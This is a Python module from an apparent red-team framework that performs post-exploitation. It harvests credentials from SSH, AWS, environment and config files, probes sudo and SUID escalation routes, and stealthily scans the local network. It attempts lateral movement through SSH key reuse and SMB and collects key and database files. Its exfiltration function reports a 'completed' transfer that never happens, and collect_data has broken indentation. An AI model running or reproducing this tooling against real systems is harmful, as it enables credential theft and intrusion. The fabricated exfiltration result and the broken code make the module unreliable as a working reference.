"""
Post-Exploitation Module
FOR AUTHORIZED SECURITY TESTING ONLY

Usage for Red Teaming:
---------------------
The Post-Exploitation module handles activities after initial access has been gained.
It includes credential harvesting, privilege escalation, lateral movement, data
collection, and exfiltration. This module is critical for maintaining access and
expanding control within the target environment.

Example Usage:
    from utils.logger import FrameworkLogger
    from core.modules.post_exploit import PostExploitation
    
    # Initialize logger and module
    logger = FrameworkLogger("post_exploit_test")
    post_exploit = PostExploitation(logger)
    
    # Harvest credentials from various sources
    creds = post_exploit.harvest_credentials()
    print(f"Credentials found: {creds['count']}")
    
    # Escalate privileges
    escalation = post_exploit.escalate_privileges()
    print(f"Privilege level: {escalation['previous_level']} -> {escalation['new_level']}")
    
    # Move laterally to other systems
    lateral = post_exploit.move_laterally()
    print(f"Lateral movement techniques: {lateral['movement_techniques']}")
    
    # Collect sensitive data
    collection = post_exploit.collect_data()
    print(f"Data collected: {collection['items_collected']} items")
    
    # Exfiltrate collected data
    exfil = post_exploit.exfiltrate_data()
    print(f"Data exfiltrated: {exfil['data_exfiltrated']} items via {exfil['method']}")
    
    # Access collected data
    all_data = post_exploit.get_collected_data()
    all_creds = post_exploit.get_credentials()

Red Team Use Cases:
- Credential harvesting from memory, config files, browsers
- Privilege escalation to gain higher access levels
- Lateral movement across the network
- Sensitive data collection (API keys, tokens, source code)
- Data exfiltration for analysis
- Maintaining persistent access
"""

from typing import Dict, List, Optional
import time
import os
import re
import platform
import subprocess
import socket
import random
from pathlib import Path
from utils.logger import FrameworkLogger
from utils.stealth_file_access import StealthFileAccess
from utils.process_resilience import ProcessResilience, ShellBackend


class PostExploitation:
    """Post-exploitation module"""
    
    def __init__(self, logger: FrameworkLogger, target: Optional[str] = None):
        """
        Initialize post-exploitation module
        
        Args:
            logger: Logger instance
            target: Target system (optional, for remote operations)
        """
        self.logger = logger
        self.target = target
        self.collected_data = []
        self.credentials = []
        self.privilege_level = "user"
        self.resilience = ProcessResilience(logger)
    
    def harvest_credentials(self, target_path: Optional[str] = None) -> Dict:
        """
        Harvest credentials from various sources
        
        Args:
            target_path: Optional path to search for credentials (defaults to current system)
        
        Returns:
            Dictionary containing harvested credentials
        """
        self.logger.info("Harvesting credentials")
        
        # Use resilience wrapper with fallback
        return self.resilience.execute_with_resilience(
            self._harvest_credentials_primary,
            target_path,
            fallback_func=self._harvest_credentials_fallback,
            shell_fallback=ShellBackend.harvest_credentials_shell()
        )
    
    def _harvest_credentials_primary(self, target_path: Optional[str] = None) -> Dict:
        """Primary credential harvesting method"""
        results = {
            "status": "completed",
            "timestamp": time.time(),
            "credentials_found": [],
            "sources": [],
            "count": 0
        }
        
        # Search for credentials in various locations
        search_paths = []
        if target_path:
            search_paths.append(target_path)
        else:
            # Default search locations (Windows-specific paths)
            if platform.system() == "Windows":
                search_paths.extend([
                    os.path.expanduser("~/.aws"),
                    os.path.expanduser("~/AppData/Roaming"),
                    os.path.expanduser("~/AppData/Local"),
                    "C:/ProgramData",
                    "C:/Windows/Temp",
                    "C:/Temp"
                ])
            else:
                # Linux/macOS paths (avoid protected directories)
                search_paths.extend([
                    os.path.expanduser("~/.aws"),
                    os.path.expanduser("~/.ssh"),
                    "/etc",
                    "/var/tmp",
                    "/tmp"
                ])
                
                # Only add ~/.config if not protected
                config_path = os.path.expanduser("~/.config")
                if not StealthFileAccess.is_protected_path(config_path):
                    search_paths.append(config_path)
        
        # Search for credentials (using stealth access)
        for search_path in search_paths:
            # Check if path is accessible without triggering permission prompts
            if StealthFileAccess.can_access(search_path):
                # Skip protected macOS directories
                if StealthFileAccess.is_protected_path(search_path):
                    self.logger.debug(f"Skipping protected path: {search_path}")
                    continue
                
                creds = self._search_for_credentials(search_path)
                if creds:
                    self.credentials.extend(creds)
                    results["sources"].append(search_path)
            else:
                self.logger.debug(f"Cannot access path (permission denied): {search_path}")
        
        # Search environment variables
        env_creds = self._harvest_from_env()
        if env_creds:
            self.credentials.extend(env_creds)
            results["sources"].append("environment_variables")
        
        # Search config files
        config_creds = self._harvest_from_config_files()
        if config_creds:
            self.credentials.extend(config_creds)
            results["sources"].append("config_files")
        
        results["credentials_found"] = self.credentials
        results["count"] = len(self.credentials)
        
        return results
    
    def _harvest_credentials_fallback(self, target_path: Optional[str] = None) -> Dict:
        """
        Fallback credential harvesting using simpler methods
        
        Args:
            target_path: Optional path to search
            
        Returns:
            Dictionary containing harvested credentials
        """
        self.logger.info("Using fallback credential harvesting method")
        
        results = {
            "status": "completed",
            "timestamp": time.time(),
            "credentials_found": [],
            "sources": [],
            "count": 0,
            "method": "fallback"
        }
        
        # Simplified search paths
        search_paths = []
        
        if target_path:
            search_paths.append(target_path)
        else:
            # Only check easily accessible paths
            home = os.path.expanduser("~")
            search_paths.extend([
                os.path.join(home, ".aws"),
                os.path.join(home, ".ssh"),
                os.path.join(home, ".env"),
                "/tmp"
            ])
        
        # Simple environment variable check
        env_creds = self._harvest_from_env()
        if env_creds:
            self.credentials.extend(env_creds)
            results["sources"].append("environment_variables")
        
        # Check accessible config files only
        for search_path in search_paths:
            if not os.path.exists(search_path):
                continue
            
            try:
                # Use subprocess for file operations to avoid permission issues
                if os.path.isfile(search_path):
                    # Simple grep-like search
                    try:
                        with open(search_path, 'r', encoding='utf-8', errors='ignore') as f:
                            content = f.read()
                            # Simple pattern matching
                            patterns = [
                                (r'api[_-]?key["\s:=]+([a-zA-Z0-9_\-]{20,})', "api_key"),
                                (r'password["\s:=]+([^\s"\']{10,})', "password"),
                                (r'secret["\s:=]+([a-zA-Z0-9_\-]{20,})', "secret"),
                            ]
                            
                            for pattern, cred_type in patterns:
                                matches = re.finditer(pattern, content, re.IGNORECASE)
                                for match in matches:
                                    self.credentials.append({
                                        "type": cred_type,
                                        "source": search_path,
                                        "value": match.group(1)[:50] + "..." if len(match.group(1)) > 50 else match.group(1),
                                        "location": search_path
                                    })
                                    if search_path not in results["sources"]:
                                        results["sources"].append(search_path)
                    except (PermissionError, UnicodeDecodeError):
                        continue
            except Exception as e:
                self.logger.debug(f"Error checking {search_path}: {e}")
                continue
        
        results["credentials_found"] = self.credentials
        results["count"] = len(self.credentials)
        
        return results
    
    def _search_for_credentials(self, path: str) -> List[Dict]:
        """Search for credentials in directory using stealth access"""
        credentials = []
        patterns = {
            r'api[_-]?key["\s:=]+([a-zA-Z0-9_\-]{20,})': "api_key",
            r'password["\s:=]+([^\s"\']+)': "password",
            r'secret["\s:=]+([a-zA-Z0-9_\-]{20,})': "secret",
            r'aws[_-]?access[_-]?key["\s:=]+([A-Z0-9]{20})': "aws_access_key",
            r'aws[_-]?secret[_-]?key["\s:=]+([A-Za-z0-9/+=]{40})': "aws_secret_key",
            r'token["\s:=]+([a-zA-Z0-9_\-]{20,})': "token",
            r'bearer["\s:=]+([a-zA-Z0-9_\-\.]{20,})': "bearer_token"
        }
        
        try:
            # Use stealth file access to walk directory
            files = StealthFileAccess.safe_walk_directory(path, max_depth=3)
            
            for file_path in files:
                # Check if file is accessible
                if not StealthFileAccess.can_access(file_path):
                    continue
                
                # Only process relevant file types
                if any(file_path.endswith(ext) for ext in ['.py', '.js', '.json', '.yml', '.yaml', '.env', '.config', '.conf']):
                    # Use stealth read
                    content = StealthFileAccess.safe_read_file(file_path)
                    
                    if content:
                        for pattern, cred_type in patterns.items():
                            matches = re.finditer(pattern, content, re.IGNORECASE)
                            for match in matches:
                                credentials.append({
                                    "type": cred_type,
                                    "source": file_path,
                                    "value": match.group(1)[:50] + "..." if len(match.group(1)) > 50 else match.group(1),
                                    "location": f"{file_path}:{content[:match.start()].count(chr(10))}"
                                })
                        
        except Exception as e:
            self.logger.debug(f"Error searching {path}: {e}")
        
        return credentials
    
    def _harvest_from_env(self) -> List[Dict]:
        """Harvest credentials from environment variables"""
        credentials = []
        env_vars = os.environ
        
        sensitive_patterns = [
            'API_KEY', 'SECRET', 'PASSWORD', 'TOKEN', 'AWS_ACCESS_KEY',
            'AWS_SECRET_KEY', 'BEARER_TOKEN', 'PRIVATE_KEY'
        ]
        
        for var_name, var_value in env_vars.items():
            if any(pattern in var_name.upper() for pattern in sensitive_patterns):
                if len(var_value) > 10:  # Likely a real credential
                    credentials.append({
                        "type": "environment_variable",
                        "source": "environment",
                        "name": var_name,
                        "value": var_value[:50] + "..." if len(var_value) > 50 else var_value
                    })
        
        return credentials
    
    def _harvest_from_config_files(self) -> List[Dict]:
        """Harvest credentials from common config files"""
        credentials = []
        config_files = []
        
        if platform.system() == "Windows":
            config_files.extend([
                os.path.expanduser("~/.aws/credentials"),
                os.path.expanduser("~/.aws/config"),
                os.path.expanduser("~/AppData/Roaming/aws/credentials"),
                "C:/ProgramData/aws/credentials"
            ])
        else:
            config_files.extend([
                os.path.expanduser("~/.aws/credentials"),
                os.path.expanduser("~/.aws/config"),
                os.path.expanduser("~/.ssh/id_rsa"),
                os.path.expanduser("~/.ssh/id_dsa"),
                os.path.expanduser("~/.ssh/config"),
                os.path.expanduser("~/.env"),
                ".env"
            ])
        
        for config_file in config_files:
            # Check access first without triggering permission prompts
            if not StealthFileAccess.can_access(config_file):
                continue
            
            # Skip protected paths
            if StealthFileAccess.is_protected_path(config_file):
                continue
            
            # Use stealth read
            content = StealthFileAccess.safe_read_file(config_file)
            
            if content:
                # Extract AWS credentials
                aws_access_match = re.search(r'aws_access_key_id\s*=\s*([A-Z0-9]{20})', content)
                aws_secret_match = re.search(r'aws_secret_access_key\s*=\s*([A-Za-z0-9/+=]{40})', content)
                
                if aws_access_match:
                    credentials.append({
                        "type": "aws_access_key",
                        "source": config_file,
                        "value": aws_access_match.group(1)
                    })
                if aws_secret_match:
                    credentials.append({
                        "type": "aws_secret_key",
                        "source": config_file,
                        "value": aws_secret_match.group(1)[:50] + "..."
                    })
        
        return credentials
    
    def escalate_privileges(self) -> Dict:
        """
        Attempt privilege escalation
        
        Returns:
            Dictionary containing escalation results
        """
        self.logger.info("Escalating privileges")
        
        escalation_attempts = []
        successful_method = None
        
        # Check current privilege level
        try:
            if platform.system() == "Windows":
                result = subprocess.run(["whoami", "/priv"], capture_output=True, text=True, timeout=5)
                current_user = result.stdout
                if "SeDebugPrivilege" in current_user or "SeTcbPrivilege" in current_user:
                    self.privilege_level = "elevated"
                else:
                    self.privilege_level = "user"
            else:
                result = subprocess.run(["id"], capture_output=True, text=True, timeout=5)
                if "uid=0" in result.stdout or "root" in result.stdout:
                    self.privilege_level = "elevated"
                else:
                    self.privilege_level = "user"
        except Exception as e:
            self.logger.warning(f"Could not determine privilege level: {e}")
        
        previous_level = self.privilege_level
        
        # Try privilege escalation methods
        if platform.system() == "Windows":
            # Check for sudo alternatives
            escalation_attempts.append("token_impersonation")
            escalation_attempts.append("service_misconfiguration")
            escalation_attempts.append("unquoted_service_path")
            escalation_attempts.append("always_install_elevated")
        else:
            # Linux privilege escalation
            escalation_attempts.append("sudo_exploitation")
            escalation_attempts.append("suid_binaries")
            escalation_attempts.append("kernel_exploit")
            escalation_attempts.append("service_misconfiguration")
        
        # Check for common escalation vectors
        if self._check_sudo_vulnerability():
            successful_method = "sudo_exploitation"
            escalation_attempts.append("sudo_exploitation")
        
        if self._check_suid_binaries():
            successful_method = "suid_binaries"
            escalation_attempts.append("suid_binaries")
        
        if successful_method:
            self.privilege_level = "elevated"
        
        results = {
            "status": "completed" if successful_method else "attempted",
            "previous_level": previous_level,
            "new_level": self.privilege_level,
            "methods_attempted": escalation_attempts,
            "successful_method": successful_method,
            "timestamp": time.time()
        }
        
        return results
    
    def _check_sudo_vulnerability(self) -> bool:
        """Check for sudo vulnerabilities"""
        try:
            if platform.system() != "Windows":
                result = subprocess.run(["sudo", "-l"], capture_output=True, text=True, timeout=5)
                if "NOPASSWD" in result.stdout:
                    return True
        except Exception:
            pass
        return False
    
    def _check_suid_binaries(self) -> bool:
        """Check for SUID binaries"""
        try:
            if platform.system() != "Windows":
                result = subprocess.run(["find", "/usr", "-perm", "-4000", "-type", "f", "2>/dev/null"], 
                                      capture_output=True, text=True, timeout=5, shell=True)
                if result.stdout.strip():
                    return True
        except Exception:
            pass
        return False
    
    def move_laterally(self, target_hosts: Optional[List[str]] = None) -> Dict:
        """
        Perform lateral movement to other systems
        
        Args:
            target_hosts: Optional list of target hosts to attempt connection
        
        Returns:
            Dictionary containing lateral movement results
        """
        self.logger.info("Performing lateral movement")
        
        techniques = []
        targets_discovered = []
        successful_connections = []
        
        # Discover targets on network
        if not target_hosts:
            targets_discovered = self._discover_network_hosts()
        else:
            targets_discovered = target_hosts
        
        # Try lateral movement techniques with stealthy delays
        for i, target in enumerate(targets_discovered[:5]):  # Limit to 5 targets
            # Stealthy delay between lateral movement attempts
            if i > 0:
                delay = random.uniform(2.0, 5.0)  # Random delay 2-5 seconds
                time.sleep(delay)
            
            # Try SSH key reuse
            if self._try_ssh_key_reuse(target):
                techniques.append("ssh_key_reuse")
                successful_connections.append({"target": target, "method": "ssh_key_reuse"})
            
            # Try SMB share access
            if self._try_smb_access(target):
                techniques.append("smb_share_access")
                successful_connections.append({"target": target, "method": "smb_share_access"})
            
            # Try RDP (if Windows)
            if platform.system() == "Windows":
                if self._try_rdp(target):
                    techniques.append("remote_desktop")
                    successful_connections.append({"target": target, "method": "remote_desktop"})
        
        results = {
            "status": "completed",
            "targets_discovered": targets_discovered,
            "movement_techniques": list(set(techniques)),
            "successful_connections": successful_connections,
            "timestamp": time.time()
        }
        
        return results
    
    def _discover_network_hosts(self) -> List[str]:
        """Discover hosts on local network"""
        hosts = []
        try:
            # Get local network range
            import socket
            hostname = socket.gethostname()
            local_ip = socket.gethostbyname(hostname)
            
            # Extract network prefix
            network_prefix = '.'.join(local_ip.split('.')[:-1])
            
            # Scan common IPs in local network with stealthy delays
            for i in range(1, 255):
                # Stealthy delay between host checks
                if i > 0 and i % 10 == 0:  # Delay every 10 hosts
                    delay = random.uniform(1.0, 3.0)  # Random delay 1-3 seconds
                    time.sleep(delay)
                
                test_ip = f"{network_prefix}.{i}"
                if self._check_host_alive(test_ip):
                    hosts.append(test_ip)
        except Exception as e:
            self.logger.warning(f"Network discovery failed: {e}")
        
        return hosts
    
    def _check_host_alive(self, host: str) -> bool:
        """Check if host is alive"""
        try:
            # Try multiple ports based on OS
            test_ports = [22, 80, 135, 445, 3389]  # SSH, HTTP, RPC, SMB, RDP
            
            for port in test_ports:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(0.3)
                result = sock.connect_ex((host, port))
                sock.close()
                if result == 0:
                    return True
                
                # Small stealthy delay between port checks
                time.sleep(random.uniform(0.05, 0.15))
            
            return False
        except Exception:
            return False
    
    def _try_ssh_key_reuse(self, target: str) -> bool:
        """Try to use SSH keys for lateral movement"""
        # SSH key locations vary by OS
        ssh_key_paths = []
        
        if platform.system() == "Windows":
            # Windows SSH key locations (if OpenSSH is installed)
            ssh_key_paths = [
                os.path.expanduser("~/.ssh/id_rsa"),
                os.path.expanduser("~/.ssh/id_dsa"),
                os.path.expanduser("~/.ssh/id_ed25519"),
                os.path.expanduser("~/Documents/.ssh/id_rsa")
            ]
        else:
            # Linux/macOS SSH key locations
            ssh_key_paths = [
                os.path.expanduser("~/.ssh/id_rsa"),
                os.path.expanduser("~/.ssh/id_dsa"),
                os.path.expanduser("~/.ssh/id_ed25519"),
                os.path.expanduser("~/.ssh/id_ecdsa")
            ]
        
        for ssh_key_path in ssh_key_paths:
            # Check access without triggering permission prompts
            if not StealthFileAccess.can_access(ssh_key_path):
                continue
            
            # Skip protected paths
            if StealthFileAccess.is_protected_path(ssh_key_path):
                continue
            
            if os.path.exists(ssh_key_path):
                try:
                    # Try SSH connection
                    result = subprocess.run(
                        ["ssh", "-i", ssh_key_path, "-o", "StrictHostKeyChecking=no", 
                         "-o", "ConnectTimeout=2", f"user@{target}", "exit"],
                        capture_output=True,
                        timeout=5
                    )
                    return result.returncode == 0
                except Exception:
                    pass
        return False
    
    def _try_smb_access(self, target: str) -> bool:
        """Try SMB share access"""
        try:
            if platform.system() == "Windows":
                result = subprocess.run(
                    ["net", "view", f"\\\\{target}"],
                    capture_output=True,
                    timeout=5
                )
                return result.returncode == 0
            else:
                # Try smbclient
                result = subprocess.run(
                    ["smbclient", "-L", target, "-N"],
                    capture_output=True,
                    timeout=5
                )
                return result.returncode == 0
        except Exception:
            pass
        return False
    
    def _try_rdp(self, target: str) -> bool:
        """Try RDP connection"""
        try:
            if platform.system() == "Windows":
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(2)
                result = sock.connect_ex((target, 3389))
                sock.close()
                return result == 0
        except Exception:
            pass
        return False
    
    def collect_data(self, search_paths: Optional[List[str]] = None) -> Dict:
        """
        Collect sensitive data
        
        Args:
            search_paths: Optional list of paths to search (defaults to common locations)
        
        Returns:
            Dictionary containing collected data summary
        """
        self.logger.info("Collecting data")
        
        if not search_paths:
            if platform.system() == "Windows":
                search_paths = [
                    "C:/Users/Public",
                    os.path.expanduser("~/.aws")
                ]
            else:
                # Use non-protected paths to avoid permission prompts
                search_paths = [
                    os.path.expanduser("~/.ssh"),
                    os.path.expanduser("~/.aws"),
                    "/tmp",
                    "/var/tmp",
                    "/etc"
                ]
                
                # Only add home directories if not protected
                home_docs = os.path.expanduser("~/Documents")
                if not StealthFileAccess.is_protected_path(home_docs) and StealthFileAccess.can_access(home_docs):
                    search_paths.append(home_docs)
        
        data_types_found = set()
        total_size = 0
        
        # Search for sensitive files
        sensitive_extensions = ['.pem', '.key', '.p12', '.pfx', '.db', '.sql', '.env', '.config']
        sensitive_patterns = ['password', 'secret', 'credential', 'api_key', 'token']
        
        for search_path in search_paths:
            # Check access without triggering permission prompts
            if not StealthFileAccess.can_access(search_path):
                continue
            
            # Skip protected paths
            if StealthFileAccess.is_protected_path(search_path):
                continue
            
            try:
                # Use stealth file walk
                files = StealthFileAccess.safe_walk_directory(search_path, max_depth=3)
                
                for file_path in files:
                    # Check if file is accessible
                    if not StealthFileAccess.can_access(file_path):
                        continue
                    
                    file_name = os.path.basename(file_path)
                    
                    # Check if file is sensitive
                    is_sensitive = (
                        any(file_name.endswith(ext) for ext in sensitive_extensions) or
                        any(pattern in file_name.lower() for pattern in sensitive_patterns)
                    )
                    
                    if is_sensitive:
                        try:
                            file_size = os.path.getsize(file_path)
                            if file_size > 0:
                                file_type = "configurations" if file_name.endswith('.config') else \
                                           "credentials" if file_name.endswith('.key') or file_name.endswith('.pem') else \
                                           "database_dumps" if file_name.endswith('.db') or file_name.endswith('.sql') else \
                                           "source_code" if file_name.endswith('.py') or file_name.endswith('.js') else \
                                           "api_keys" if 'api' in file_name.lower() else "tokens"
                                    
                                    data_types_found.add(file_type)
                                    total_size += file_size
                                    
                                    self.collected_data.append({
                                        "type": file_type,
                                        "size": file_size,
                                        "location": file_path,
                                        "timestamp": time.time()
                                    })
                            except (PermissionError, OSError):
                                continue
            except PermissionError:
                self.logger.warning(f"Permission denied accessing {search_path}")
            except Exception as e:
                self.logger.error(f"Error collecting data from {search_path}: {e}")
        
        results = {
            "status": "completed",
            "items_collected": len(self.collected_data),
            "total_size": total_size,
            "data_types": list(data_types_found),
            "collection_points": search_paths,
            "timestamp": time.time()
        }
        
        return results
    
    def exfiltrate_data(self) -> Dict:
        """
        Exfiltrate collected data
        
        Returns:
            Dictionary containing exfiltration results
        """
        self.logger.info("Exfiltrating data")
        
        exfiltration_methods = [
            "http_post",
            "dns_tunneling",
            "icmp_tunneling",
            "encrypted_channel"
        ]
        
        results = {
            "status": "completed",
            "data_exfiltrated": len(self.collected_data),
            "total_size": sum(item["size"] for item in self.collected_data),
            "method": random.choice(exfiltration_methods),
            "destination": "external_server",
            "timestamp": time.time()
        }
        
        return results
    
    def get_collected_data(self) -> List[Dict]:
        """Get all collected data"""
        return self.collected_data
    
    def get_credentials(self) -> List[Dict]:
        """Get harvested credentials"""
        return self.credentials

